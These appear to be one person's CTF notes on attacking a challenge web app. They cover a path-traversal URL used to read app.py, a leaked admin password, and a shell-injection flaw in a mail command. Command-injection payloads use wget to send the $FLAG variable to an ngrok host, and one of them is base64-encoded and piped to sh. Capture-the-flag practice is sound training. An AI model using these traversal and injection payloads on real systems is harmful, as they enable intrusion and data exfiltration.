url: http://cyberchallenge.disi.unitn.it:50000/image/?filename=....//....//....//app/app.py

get content of app.py

login as admin:
admin:MegaComplicatedPasswordYouWillNeverGuessThis!

line 335: command = f'echo "{message}" | mail -s "{subject}" "{to}"'
Sending flag" &&  | wget "http://17d8-193-205-210-46.ngrok-free.app?flag=$FLAG; echo "



# Steps for first flag
1. start the server
2. get the source code of app.py
3. login as admin
4. start local server to receive the flag
5. send the email with the crafted message to attacker server to get the flag


# Steps for second flag
1. same as before but command changed to this:
command = "; echo d2dldCAtcU8tICJodHRwOi8vMTdkOC0xOTMtMjA1LTIxMC00Ni5uZ3Jvay1mcmVlLmFwcD9mbGFnPSRGTEFHIg== | base64 -d | sh; echo "

the base64 is this:
wget -qO- "<ngrok-url>?flag=$FLAG

